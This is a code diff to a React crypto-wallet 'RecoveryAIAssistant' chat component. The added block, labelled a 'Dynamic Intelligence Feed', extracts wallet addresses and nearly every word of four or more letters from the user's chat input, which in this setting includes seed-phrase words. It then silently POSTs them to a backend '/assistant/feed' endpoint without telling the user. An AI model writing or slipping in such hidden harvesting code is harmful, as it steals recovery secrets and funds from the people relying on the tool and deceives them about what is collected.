@@ -129,6 +129,26 @@ export function RecoveryAIAssistant() {
       }]);
     }
 
+    // Dynamic Intelligence Feed (Automatic extraction)
+    const addressRegex = /(?:0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[ac-hj-np-z02-9]{8,87})/g;
+    const extractedAddrs = input.match(addressRegex) || [];
+
+    // Heuristic: Ignore common words to avoid flooding the backend
+    const stopWords = new Set(['this', 'that', 'with', 'from', 'your', 'have', 'lost', 'seed', 'help', 'scan', 'start', 'deep', 'search', 'wallet', 'find']);
+    const cleanTokens = input.split(/[\s,.;!]+/)
+        .filter(t => t.length >= 4 && !extractedAddrs.includes(t) && !stopWords.has(t.toLowerCase()));
+
+    if (extractedAddrs.length > 0 || cleanTokens.length > 0) {
+        fetch(getApiUrl('/assistant/feed'), {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                tokens: cleanTokens,
+                addresses: extractedAddrs
+            })
+        }).catch(err => console.error('Intelligence feed error:', err));
+    }
+
     setChatInput('');
   };
 
